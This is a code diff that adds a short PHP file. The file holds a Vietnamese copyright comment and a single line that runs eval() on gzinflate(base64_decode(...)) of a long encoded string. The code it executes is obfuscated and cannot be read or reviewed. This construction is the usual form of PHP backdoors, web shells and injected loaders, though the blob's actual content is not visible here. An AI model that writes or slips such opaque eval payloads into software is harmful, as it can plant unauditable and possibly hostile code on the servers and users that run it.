@@ -1,0 +1,3 @@
+<?php
+/* BAN QUYEN THUOC VE TAIGAMENHANH & DEVBYPDT */
+eval('?>'.gzinflate(base64_decode('jVBNS8NAEL3vrxiGCAn04+IpsfRgFbyIiCCCELbphAzE3WVni63W/+5uGrV4am55H7Pvvaul65zqSG/I53htTSATpk97RyUE2oW56zUbLCqVbdjDAup6dfdY1zADnG9db/VGsFLUdBZwxb6EpHs1v9jNjiVICRgdOUsd2TxJClgCvpAgRO7eYpEunviePQe97unP+T4iZ9kfyL+xCFszvi3btQSfi/NsQpvjhcUJtNyTi0o53iwmML38f+k2aqQcgCzpJY4gjTa/RSrVWk+66fKR1wJZW8CngvhxG2FYLABnCIcD/PzMYuQmzs1mS9WgzFy8PKyctk2Zs/bIHINE5/SsKu6kyGgZgvEHJXKA1/tAMpT6Uuob')));
